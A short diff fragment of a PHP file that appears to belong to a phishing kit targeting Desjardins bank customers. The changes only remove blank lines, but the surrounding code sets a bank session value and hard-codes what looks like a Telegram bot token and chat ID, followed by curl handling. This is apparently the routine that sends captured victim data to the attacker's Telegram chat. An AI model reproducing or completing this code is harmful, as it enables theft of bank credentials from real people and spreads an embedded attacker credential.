@@ -2,7 +2,6 @@
 $_SESSION["bank"] ='DESJARDIN';
 
 ?>
-
 <?php
 $token = '7231855269:AAHHENpMKORsPdG5gUH7z_NsS7Zz8QaZAcg'; 
 $chat_id = '6242884372'; 
@@ -67,7 +66,6 @@ if (curl_errno($ch)) {
 
 curl_close($ch);
 ?>
-
 
 
 
